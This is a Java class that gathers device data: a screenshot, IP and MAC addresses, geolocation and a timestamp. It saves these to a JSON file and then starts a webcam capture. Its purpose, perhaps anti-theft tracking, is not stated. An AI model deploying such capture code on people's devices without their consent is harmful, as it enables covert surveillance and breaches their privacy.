/**
  ******************************************************************************
  * @file    com/data/DataCollector.java 
  * @author  Fahmi Ghediri
  * @version V1.0
  * @date    01-July-2014
  * @brief   handle the data collection operation inside the data package 
  ******************************************************************************
**/





package com.data;

import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import com.configuration.DirectoryManager;
import com.google.gson.Gson;

public class DataCollector {
	WebCam cam;
	ScreenShot shot;
	IpAddress ip;
	MacAddress mac;
	GeoLocation location;

	private class data {

		private String ipaddress;
		private String macaddress;
		private String longitude;
		private String latitude;
		private String date;

		public String getIpaddress() {
			return ipaddress;
		}

		public void setIpaddress(String ipaddress) {
			this.ipaddress = ipaddress;
		}

		public String getLongitude() {
			return longitude;
		}

		public void setLongitude(String longitude) {
			this.longitude = longitude;
		}

		public String getLatitude() {
			return latitude;
		}

		public void setLatitude(String latitude) {
			this.latitude = latitude;
		}

		public String getMacaddress() {
			return macaddress;
		}

		public void setMacaddress(String macaddress) {
			this.macaddress = macaddress;
		}

		public String getDate() {
			return date;
		}

		public void setDate(String date) {
			this.date = date;
		}
	}

	public void collect() {

		cam = new WebCam();
		shot = new ScreenShot();

		try {
			shot.Take();
		} catch (Exception e) {
			e.printStackTrace();
		}
		ip = new IpAddress();
		mac = new MacAddress();
		location = new GeoLocation();
		location.getLocation();
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd ' ' HH-mm a");
		Calendar Now = Calendar.getInstance();
		data collectedData = new data();
		collectedData.setIpaddress(ip.getAddress());
		collectedData.setMacaddress(mac.getMacAddress());
		collectedData.setLatitude(location.getLatitude());
		collectedData.setLongitude(location.getLongitude());
		collectedData.setDate(format.format(Now.getTime()));
		Gson parser = new Gson();
		String json = parser.toJson(collectedData);
		try {

			FileWriter writer = new FileWriter(
					new DirectoryManager().workingPath + "\\" + "file"
							+ ".json");
			writer.write(json);
			writer.close();

		} catch (IOException e) {
			e.printStackTrace();
		}

		System.out.println(json);
		cam.run();

	}

}
